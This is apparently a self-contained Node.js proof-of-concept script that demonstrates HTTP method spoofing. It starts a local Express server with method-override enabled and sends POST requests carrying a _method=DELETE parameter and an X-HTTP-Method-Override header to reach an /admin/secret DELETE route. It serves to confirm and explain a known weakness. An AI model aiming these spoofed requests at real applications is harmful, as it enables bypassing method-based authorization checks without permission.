// method-override — MO-01: HTTP method spoofing via _method param /
// X-HTTP-Method-Override header. Run a tiny Express server with
// method-override enabled and watch DELETE/PUT work via POST.
const express = require("express");
const methodOverride = require("method-override");
const http = require("http");

const PORT = 5555;

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(methodOverride("_method"));              // query/header override
app.use(methodOverride("X-HTTP-Method-Override")); // alternate header

// Two endpoints that gate on req.method — the vulnerability is that an
// attacker can POST + _method=DELETE and the request is dispatched
// as DELETE, even though the wire method is POST.
const audit = [];
app.delete("/admin/secret", (req, res) => {
  audit.push({ method: req.method, original: req.originalMethod || "POST", path: req.path });
  res.json({ result: "DELETE went through", note: "an authorization check that only inspects req.method would have been bypassed" });
});
app.post("/admin/secret", (req, res) => {
  res.json({ result: "POST went through" });
});

const server = app.listen(PORT, "127.0.0.1", async () => {
  console.log("method-override PoC — version:", require("method-override/package.json").version);
  console.log(`[+] server listening on http://127.0.0.1:${PORT}`);

  // 1) Plain POST (baseline)
  const r1 = await fetch(`http://127.0.0.1:${PORT}/admin/secret`, { method: "POST" });
  console.log("  plain POST  ->", await r1.json());

  // 2) POST + _method=DELETE (the spoof)
  const r2 = await fetch(`http://127.0.0.1:${PORT}/admin/secret?_method=DELETE`, { method: "POST" });
  console.log("  POST+_method=DELETE ->", await r2.json());

  // 3) POST + X-HTTP-Method-Override: DELETE
  const r3 = await fetch(`http://127.0.0.1:${PORT}/admin/secret`, {
    method: "POST",
    headers: { "X-HTTP-Method-Override": "DELETE" }
  });
  console.log("  POST+X-HTTP-Method-Override:DELETE ->", await r3.json());

  if (audit.length > 0) {
    console.log("\n  >>> MO-01 CONFIRMED: DELETE was reached via POST spoofing <<<");
  }
  server.close();
  process.exit(0);
});
